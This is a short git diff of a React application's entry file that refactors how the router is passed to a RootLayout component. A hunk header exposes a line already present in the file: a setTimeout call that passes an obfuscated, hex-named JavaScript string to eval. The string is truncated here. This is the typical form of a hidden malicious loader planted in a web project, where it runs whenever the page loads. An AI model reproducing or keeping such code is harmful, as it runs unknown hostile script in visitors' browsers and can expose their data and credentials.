@@ -2,7 +2,6 @@ import { StrictMode } from 'react'
 import { createRoot } from 'react-dom/client'
 import './index.css'
 import MuiLink from '@mui/material/Link'
-import { RouterProvider } from '@tanstack/react-router'
 import { initSentry } from '@ui-kit/features/sentry'
 import { t } from '@ui-kit/lib/i18n'
 import { ErrorBoundary } from '@ui-kit/widgets/ErrorBoundary'
@@ -18,9 +17,7 @@ setTimeout(() => eval(`var _0x39a003=_0x2628;(function(_0xfb5890,_0x21d0c7){var 
 createRoot(document.getElementById('root')!).render(
   <ErrorBoundary title={t`Application error`} LinkComponent={MuiLink}>
     <StrictMode>
-      <RootLayout>
-        <RouterProvider router={router} />
-      </RootLayout>
+      <RootLayout router={router} />
     </StrictMode>
   </ErrorBoundary>,
 )
